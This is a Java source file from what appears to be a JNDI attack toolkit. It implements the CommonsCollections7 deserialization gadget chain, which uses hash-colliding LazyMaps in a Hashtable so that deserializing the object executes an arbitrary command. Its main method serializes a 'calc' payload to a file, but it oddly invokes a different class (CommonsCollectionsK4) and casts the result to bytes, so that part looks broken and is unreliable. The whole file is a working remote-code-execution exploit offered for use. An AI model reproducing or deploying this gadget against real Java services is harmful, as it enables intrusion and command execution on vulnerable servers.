package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileOutputStream;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.SCRISTALLI, Authors.HANYRAX, Authors.EDOARDOVIGNATI})

public class CommonsCollections7 implements ObjectPayload<Hashtable> {

    public Hashtable getObject(PayloadType type, String... param) throws Exception {
        String              command          = param[0];
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = TransformerUtil.makeTransformer(command);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }

    public static void main(String[] args) throws Exception {
        String           cmd    = "calc";
        String[]         params = new String[]{cmd};
        byte[]           bytes = (byte[]) CommonsCollectionsK4.class.getMethod("getObject", PayloadType.class, String[].class).invoke(CommonsCollectionsK4.class.newInstance(), PayloadType.qi4l, params);
        FileOutputStream fous  = new FileOutputStream("6666.ser");
        fous.write(bytes);
        fous.close();
    }
}
